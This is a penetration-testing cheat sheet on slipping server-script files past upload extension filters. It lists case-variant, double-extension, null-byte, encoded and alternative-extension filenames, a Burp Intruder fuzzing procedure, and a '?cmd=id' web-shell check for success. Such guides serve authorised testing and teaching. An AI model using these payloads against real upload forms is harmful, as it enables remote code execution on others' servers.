# File Upload — Extension Bypass

## When this applies

- Server validates uploaded filename against a blocklist or whitelist of extensions.
- Validation is naive (string match, single-pass strip, regex without anchoring).
- Goal: get a server-script extension past the validator while keeping it executable.

## Technique

Try case variation, double extensions, trailing characters/null bytes, URL/Unicode encoding, and alternative-but-executable extensions. Match the bypass to the validator's flaw.

## Steps

### Case variation

```
exploit.pHp
exploit.PhP
exploit.PHp
exploit.aSp
exploit.aSpX
```

### Double extensions

```
exploit.php.jpg
exploit.php.png
exploit.php.gif
exploit.php.pdf
exploit.jpg.php
exploit.png.php
```

The bypass `shell.jpg.php` exploits `strpos($file, '.jpg') !== false` substring checks while Apache executes the final `.php`.

### Trailing characters

```
exploit.php.
exploit.php..
exploit.php...
exploit.php%20
exploit.php%0a
exploit.php%00
exploit.php%0d%0a
exploit.php/
exploit.php.\
```

### Null byte injection

```
exploit.php%00.jpg
exploit.php%00.png
exploit.php\x00.jpg
exploit.asp%00.png
exploit.jsp%00.gif
```

### URL encoding

```
exploit%2Ephp
exploit.php%20
exploit%2easp
test.asp%00.jpg
```

### Unicode/UTF-8 encoding

```
exploit.php
exploit.%u0070hp
xC0%AE (Unicode representation of .)
xC4%AE (alternate encoding)
```

### Alternative extensions — PHP

```
.php
.php3
.php4
.php5
.php7
.pht
.phtml
.phar
.phpt
.pgif
.phtm
.inc
```

### Alternative extensions — ASP

```
.asp
.aspx
.asa
.cer
.ashx
.asmx
.config
```

### Alternative extensions — JSP

```
.jsp
.jspx
.jsw
.jsv
.jspf
```

### Other server-side extensions

```
.pl (Perl)
.py (Python)
.cgi
.sh
.rb (Ruby)
.exe
.dll
.msi
```

### Burp Intruder for extension fuzzing

```
1. Send upload request to Intruder
2. Position payload marker on filename extension:
   filename="exploit.§php§"
3. Payloads tab > Load extension wordlist:
   php, php3, php4, php5, pht, phtml, phar
4. Start attack
5. Analyze responses for successful uploads
```

## Verifying success

- Upload returns success status with the modified extension.
- Accessing the uploaded file executes the script (`?cmd=id` returns command output).
- Different extensions yield different behaviors: text rendering vs execution.

## Common pitfalls

- Modern Apache normalizes case before matching — case-only bypass fails. Combine with double-extension.
- Whitelist (allow `.jpg, .png` only) defeats most extension tricks — pivot to .htaccess upload (see `apache-htaccess-and-iis-webconfig.md`) or polyglots.
- Null-byte bypass only works on legacy PHP/C — useless against modern Java/Go.

## Tools

- Burp Suite Intruder (Sniper, with extension wordlist)
- ffuf / wfuzz with `-X POST` and file payload
- fuxploider
